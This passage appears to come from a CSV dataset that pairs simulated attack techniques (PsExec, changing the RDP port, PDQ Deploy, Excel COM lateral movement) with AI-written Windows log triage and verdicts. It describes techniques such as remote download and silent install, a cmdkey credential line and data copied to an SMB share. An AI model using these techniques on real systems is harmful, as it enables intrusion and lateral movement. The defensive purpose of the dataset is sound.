- **Activity Resolution:** **SUSPICIOUS** 
  - While the majority of processes occur under the normal operation scope (e.g., system updates), the particular PowerShell use and the associated command imply potential data access or transfer actions that need further investigation.
  
- **Threats or Risks Identified:** The principal concern is if the SMbMapping and copy command were initiated by an authorized user within an accepted policy framework or if it represents unauthorized data exfiltration attempts. The usage of `-SkipCertificateCheck` warrants attention to potential security policy violations.
  
- **Actionable Steps:**
  - Investigate the context and source of the PowerShell command execution and confirm whether it aligns with authorized and documented procedures.
  - Conduct network monitoring to identify any unusual data activity associated with `\\example.com\sales`.
  - Review user access logs and permissions to ensure compliance with access policies.
  - Consider further endpoint monitoring strategies for early anomaly detection.

This conclusion stems from the observed behavior, requiring follow-up to rule out any potential data security violations."
Copy and Execute File with PsExec,"Based on the provided logs, here is an analysis of the observed activities:

1. **Suspicious Process Execution:**
   - There is an entry of `PSEXESVC.exe` starting as a new service (Event ID: 7045, System log). This executable is often associated with the PsExec tool, part of the Sysinternals suite used for remote command execution.
   - Multiple executions of PowerShell with `admin_test` account usage. PowerShell is a powerful scripting environment and often used in post-exploitation.
   - The execution of `wevtutil.exe`, `cmd.exe` with scripts from unusual directories, and `whoami.exe` by the `admin_test` user indicate possible reconnaissance or privilege escalation processes.

2. **Privilege Escalation:**
   - There are events (Security log, Event ID: 4672) that show privilege assignments such as `SeDebugPrivilege`, which are sensitive and often used in attacks to gain more control over the system.
   - 'admin_test' user acquiring these privileges through NTLM logon events.

3. **Service and Application Updates:**
   - Regular updates for Microsoft Edge and Windows Defender are seen in the logs. These do not appear immediately suspicious but confirm legitimate update activities.

4. **Malicious Indicators:**
   - Usage of potentially legitimate administrative tools (e.g., PsExec) in an unusual manner or context, often linked to lateral movement or execution of commands remotely without explicit permissions.
   - The execution of a script located in `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\script.exe`, especially with `cmd.exe` through `PsExec`, is highly suspicious, as temporary folders are typically used by malware to stage files.

5. **Logins and Network:**
   - Multiple log-on events by `admin_test` via NTLM and from different IPs may suggest password spraying or credential misuse.
   - LogonType is 3, which indicates a network logon, normally used by a remote process. Combined with suspicious activity, it hints at potential lateral movement.

**Assessment:**
Given the indicators (PsExec service installation, privilege usages, script execution from temporary directories), the activities in the logs suggest potential malicious actions. These actions may imply a compromise or unauthorized use of administrative tools for establishing persistence, lateral movement, or system manipulation.

**Resolution: MALICIOUS**

**Guidance:**
- Conduct a forensic analysis of the system to identify any backdoors or persistence mechanisms.
- Immediately investigate the `admin_test` account for unusual activities or suspicious access from different IPs.
- Engage endpoint detection and response measures to determine if the system is part of a wider compromise.
- Audit other systems in the network for similar malicious indicators.
- Change all necessary credentials and enforce stronger security controls, such as multi-factor authentication.
- Review and strengthen security policies regarding administrative tool use and privilege allocations."
Changing RDP Port to Non Standard Port via Powershell,"After analyzing the provided log entries from the Security, System, Sysmon, Application, and PowerShell logs, I have identified a few points worthy of note:

1. **PowerShell Activity**: The Windows PowerShell log indicates a PowerShell execution modifying RDP settings and creating a new firewall rule. Specifically:
   - It modifies registry key `'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'` to change the `PortNumber` to `4489`.
   - It creates a new firewall rule named `'RDPPORTLatest-TCP-In'` to allow inbound traffic on the new RDP port.
   
   This activity is highly suspicious as it involves changing the default RDP port and may indicate an attempt to bypass security monitoring or to prepare the system for remote access without detection.

2. **Sysmon Logs**: These logs show the execution of multiple system utilities, including `whoami.exe`, `wevtutil.exe`, and `hostname.exe`, run by `SERVER002\admin_test`:
   - The use of `wevtutil.exe` could indicate log tampering or querying.
   - Frequent execution of administrative tools and system utilities like `whoami.exe` and `wevtutil.exe` may suggest reconnaissance or privilege enumeration activities.

3. **Security Logs**: EventID 5379 indicates failed attempts to read credentials in the security log:
   - The error code `3221226021` suggests a security descriptor parsing problem or insufficient permissions.
   - Repeated failed attempts may indicate a possible attempt to enumerate or extract credentials, which is suspicious.
   
4. **System Logs**: Normal updates for Windows Defender are recorded, which is benign.

Considering the identified activities, particularly the PowerShell script modifying RDP configurations and creating a firewall rule for a non-standard port, there is a strong indication of potentially malicious behavior intended to persist unauthorized access to the system.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately investigate and contain the scope of this unauthorized change to prevent remote unauthorized access.
- Conduct a thorough forensic analysis to identify potential unauthorized access and persistence mechanisms.
- Apply patches and change passwords, especially for any administrative accounts.
- Consider isolating the affected host from the network and reviewing all firewall configurations.
- Strengthen monitoring on any use of administrative tools and review PowerShell use policies to detect similar activities in the future."
PDQ Deploy RAT,"Upon reviewing the provided Windows event logs, here are the findings and analysis that might indicate suspicious or malicious activity:

1. **Service Control Manager Event:**
   - **Event ID 7045:** Indicates a new service, ""PDQ Deploy,"" was installed on the system. The service is linked to ""PDQDeployService.exe"" and is set to ""disabled."" Although PDQ Deploy is a legitimate software for deployment tasks, its installation and execution via scripts may be of interest if it wasn't previously planned or approved.

2. **Windows PowerShell Activity:**
   - **PowerShell Event ID 403 and 600:** Powershell was used to download and silently install ""PDQ Deploy"" using the `Invoke-WebRequest` for a direct download and `Start-Process` to initiate the installer silently. Installing software through PowerShell, especially with `-ExecutionPolicy Restricted`, can be suspicious if not authorized, indicating potential automation or attempts to bypass interactive prompts.
   - **Scripted Searches on INF Files:** A PowerShell script was used to search for specific patterns in INF files (`defaultinstall.nt(amd64|arm|arm64|x86)`). This behavior could be part of a reconnaissance script querying the system's installation files for specific setup parameters, indicating a higher level of access or intent beyond normal usage.

3. **Sysmon Logs:**
   - Frequent execution of core Windows utilities (e.g., `cmd.exe`, `wevtutil.exe`, `conhost.exe`) by the user ""SERVER002\\admin_test"" could indicate scripted activities. Notably, `wevtutil.exe` is involved in managing event logs, which could be used for clearing or dumping logs maliciously.
   - Execution of `HOSTNAME.EXE` and `whoami.exe`: These could be part of a scripted reconnaissance to verify the host information and currently logged-in users.
   - Execution of `PDQDeployConsole.exe`: The deployment tool was triggered via `cmd.exe`, which matches with the observed PowerShell installation activity. This might be an automated series of tasks.

4. **Application Logs:**
   - **MsiInstaller Event ID 11707:** Confirms that PDQ Deploy installation completed successfully. However, since the execution was handled through PowerShell scripting, it's crucial to verify if this activity was planned.

5. **User Activity:**
   - All suspicious activities appear to be executed by the user ""SERVER002\\admin_test,"" which suggests unauthorized actions that need to be validated with the user or IT management.

### Assessment:

Given the analysis:

- The use of scripting to download and silently install software.
- Automated looks into system configurations using PowerShell.
- Execution of potential reconnaissance commands.

**Resolution: SUSPICIOUS**

The logs indicate potentially unauthorized software installation and reconnaissance activity. While the activity might be part of legitimate IT operation tasks (such as software updates or installations), it fits patterns that could indicate malicious intent if such activities were not previously authorized or known. It requires further investigation and verification with the user or involved parties to verify the legitimacy of these events.

### Guidance on How to Proceed:
- **Verification**: Confirm with the IT department if there was an authorized installation or update involving the use of PDQ Deploy.
- **User Inquiry**: Check with the user ""SERVER002\\admin_test"" to verify the intent behind the activities or if their credentials might be compromised.
- **Review Administrative Actions**: Check for any authorized administrative actions on the host.
- **Monitoring**: Increase monitoring on the system and account for further unexpected behavior or anomalies."
Deploy 7-Zip Using Chocolatey,"After reviewing the provided Windows event logs, here's a detailed analysis of the entries:

1. **Application log:**
   - The application logs show multiple entries indicating that the Edge Update service stopped twice in quick succession. Although this might seem concerning, the presence of such logs can be common during updates or system maintenance. 

2. **Sysmon logs:**
   - At the start of the Sysmon logs, we see legitimate processes such as `MicrosoftEdgeUpdate.exe` running with the `/svc` command-line argument, which is typical behavior for update services.
   - The logs include processes like `powershell.exe` executing a command: `choco install -y 7zip`. While this command is for installing software via Chocolatey, a package manager often used for managing Windows software, its invocation through a scheduled or unexpected script could be suspicious.
   - Other benign process executions listed include `wevtutil.exe` and `conhost.exe`, which are part of standard operations and interactions within Windows.
   - Regular Microsoft Edge Update operations are being executed with various commands lines such as `/update`, `/ping`, and `/regserver`, all usually corresponding to update and registration tasks.
   - There's also an appearance of `whoami.exe`, which might be used in scripts to check user identity or during routine checks.

3. **PowerShell logs:**
   - A PowerShell script was executed with the intent to install 7-Zip using Chocolatey. This could be part of routine software deployment if approved by the organization. 
   - PowerShell processes were started and stopped, but no other commands or behaviors indicating malicious operations were logged.

4. **Security and System logs:**
   - No anomalies or suspicious activities were recorded here. Particularly, there were no entries indicating failed logons, privilege escalation, or other typical signs of security incidents.

**Assessment:**
While certain command-line executions, particularly involving PowerShell, may catch attention, they are not inherently malicious in this context given the absence of abnormal installations or modifications attempting to escalate privileges. Such activities align with expected software update and administrative maintenance tasks on a Windows server.

**Resolution Recommendation:** BENIGN

**Guidance:** 
- Maintain regular monitoring of such logs to ensure that similar entries are consistent with known updates or maintenance activities.
- Verify the legitimacy of automated scripts or scheduled tasks triggering PowerShell commands to ensure they are authorized.
- Consider white-listing known and approved software management tools like Chocolatey if they are standard for your organization's IT operations."
Changing RDP Port to Non Standard Port via Command_Prompt,"After a thorough analysis of the provided log entries across various event logs -- Security, System, Application, and Sysmon -- we have identified several key observations:

### Key Observations:

1. **Time Change Events (Event ID 4616 and others):**
   - There is a change in the system time initiated by `svchost.exe` process. The system time has been set back. Such behavior might be part of a legitimate system task; however, unauthorized time changes are often linked to tampering efforts or attempts to circumvent security measures such as timestamps in logs.

2. **Privileged Logon and Privilege Use (Event ID 4672):**
   - The user ""admin_test"" is associated with a logon session that uses several high-privilege rights such as SeDebugPrivilege, SeTakeOwnershipPrivilege, SeSystemEnvironmentPrivilege, etc. Although these may be part of normal administrative tasks, they require validation to confirm legitimate use.

3. **Command-Line from Sysmon (Event ID 1):**
   - There is a command executed by cmd.exe to change the RDP port (`HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`) and firewall settings. This type of action can be suspicious if not part of a planned and authorized IT maintenance operation.

4. **Frequent Use of Administrative Tools and Network Configurations:**
   - The presence of `wevtutil.exe`, `reg.exe`, and `netsh.exe`, particularly in administrative modes, indicates system-level changes. These actions need verification against legitimate change tickets.

5. **Normal System and Software Updates:**
   - The logs demonstrate routine operations such as Windows Defender updates and Microsoft Edge updates. These appear legitimate with no signs of manipulation or compromise.

### Assessment:

- **SUSPICIOUS:**
  - The combination of unauthorized time adjustments, unusual command executions altering system configuration (RDP port change, firewall rule addition), and the use of high-level privileges without clear indication of a legitimate administrative task raises suspicion.
  - There is no direct evidence of malicious software or clear signs of compromise. However, the activities observed require context checks, such as confirming administrative change requests and reviewing the user's actions or roles.

### Recommendations:

1. **Review Change Management Records:**
   - Verify if the time changes and RDP configuration modifications are authorized and part of legitimate administrative operations.
   
2. **User and Access Management Review:**
   - Investigate the activities of the ""admin_test"" user to ensure all actions align with their role and responsibilities.

3. **Enhanced Monitoring:**
   - Increase monitoring on ""Server002"" for any further unauthorized configurations or attempts to conceal actions (e.g., further time changes).

4. **Network and Security Configuration:**
   - Evaluate current firewall configurations and RDP settings to ensure they comply with security policies.

5. **Incident Response Exploration:**
   - Consider initiating a low-level incident response to further investigate potential misuses or any unseen emerging threats.

Given the analysis, the final resolution for the provided logs is ""SUSPICIOUS"" due to activities that warrant further investigation."
RDP to DomainController,"**Detailed Analysis of the Logs**

1. **Security Log:**
   - Most of the events with ID 5379 indicate instances of failed credential requests and failed logon attempts due to the return code `3221226021`, which represents a status indicating an unknown username or a bad password. This repeated behavior, especially if not anticipated, can be a sign of a brute force attempt or a similar attack.
   - Events 4624 (successful logon) and 4672 (special privileges assigned to a new logon) show that the SYSTEM account is being logged on with elevated privileges, which is generally expected for system processes and maintenance tasks.

2. **Sysmon Log:**
   - A series of processes are being executed by the user `SERVER002\admin_test`, including `powershell.exe` with a command line that contains potentially sensitive operations like password usage and remote desktop connection (`cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password`). The presence of plain-text passwords in the command line is a security risk and suggests improper handling of credentials, which could be exploited by malicious actors.
   - The execution of `cmdkey.exe` and `mstsc.exe` further declares operations for setting and using credentials for Remote Desktop Protocol (RDP), which might be legitimate but should be verified given the password exposure.

3. **Windows PowerShell Log:**
   - Logs indicate PowerShell scripts executed by `admin_test`, matching the Sysmon entries and confirming the plain-text password usage for setting RDP connections. This exposure requires correction by employing more secure practices like secure-string parameters.

4. **System and Application Logs:**
   - These logs show regular system and application operations, including system updates and internal system tool activities.

**Assessment and Resolution:**

Based on the analysis, the behavior observed in the logs represents a mix of normal operations and potential security risks. The critical point of concern is the use of PowerShell scripts that expose credentials in plain-text, which is a risky practice potentially indicative of mishandled security practices rather than direct malicious intent. The repeated authentication failures also require attention to ensure they don't signify unauthorized access attempts.

**Resolution:**
- **SUSPICIOUS**: The activities related to the plain-text password handling and failed credential requests deem further investigation. These operations don't immediately confirm malicious activity but point towards questionable security practices and potential vulnerabilities that need addressing.

**Guidance on How to Proceed:**
1. **Investigate the Scripted Tasks:**
   - Review the PowerShell scripts and related automation tasks for security compliance. Ensure that sensitive information such as passwords is not hard-coded or exposed.

2. **Review Account Activity:**
   - Investigate the account `admin_test` for unusual or unauthorized activities and verify that this operation aligns with a legitimate user requirement.

3. **Credential Handling Improvement:**
   - Implement more secure credentials handling techniques, such as using PowerShell secure strings and avoiding plain-text passwords.

4. **Conduct Security Training:**
   - Educate users on secure scripting practices and the importance of protecting sensitive credentials to minimize future exposure risks."
PowerShell Lateral Movement Using Excel Application Object,"Upon reviewing the provided logs, let's assess the key activities that may indicate suspicious or malicious behavior:

### System Log:
The System log entries are related to Windows Update and Microsoft Defender updates. These entries show the routine update operations of the Microsoft Defender Antivirus definitions, indicating expected behavior without evidence of tampering.

### Windows PowerShell Log:
The PowerShell logs show the execution of a command that attempts to copy the `calc.exe` file to a location identified as `foxprow.exe`, followed by COM object creation to launch Microsoft Excel. This activity is unusual and suspicious because:
1. Copying system files (`calc.exe`) and renaming them (potentially to masquerade as another application) is a typical behavior used by malware to disguise itself.
2. Interaction with Excel using COM objects could suggest an attempt to execute malicious code within Excel.

Moreover, the attempt to copy `calc.exe` failed due to path errors, indicating an incomplete operation, but the intent to perform unusual actions persists.

### Sysmon Log:
The Sysmon logs show several processes, including multiple instances of `wevtutil.exe` and `conhost.exe`, involving the user `SERVER002\admin_test`. While `wevtutil.exe` usage for legitimate log management tasks is normal, multiple instances could imply enumeration or manipulation of event logs, often a tactic by attackers to cover up tracks.

The Sysmon log also correlates the PowerShell execution with the suspicious PowerShell activity already noted, providing additional context that confirms its execution.

### Conclusion:
The combination of attempting to conduct unusual PowerShell activities, renaming and copying a known executable like `calc.exe`, and interaction with Excel via COM, alongside multiple `wevtutil.exe` executions, suggests potentially malicious intent or activity requiring further investigation.

### Resolution:
**SUSPICIOUS**

### Guidance on How to Proceed:
1. **Further Investigation**: Conduct a deeper forensic analysis on `Server002` to check for additional signs of compromise. Pay particular attention to recent file modifications, unauthorized scheduled tasks, and any new or unknown network connections.
   
2. **User and Process Monitoring**: Increase monitoring for the user account `admin_test` and any related processes, specifically looking for further anomalous behavior.

3. **Network Traffic Analysis**: Check network logs for any unusual outbound connections during the timeframe of these events, focusing on any connections leading from `Server002` to external IPs.

4. **Endpoint Security**: Ensure endpoint security measures are up-to-date and performing correctly, running immediate scans on `Server002`.

5. **Review Security Policies**: Reassess security policies regarding PowerShell script execution and COM object access, implementing more restrictive rules where possible to prevent misuse.

By following these steps, you'll be in a better position to determine if an actual compromise occurred and mitigate the risks accordingly."
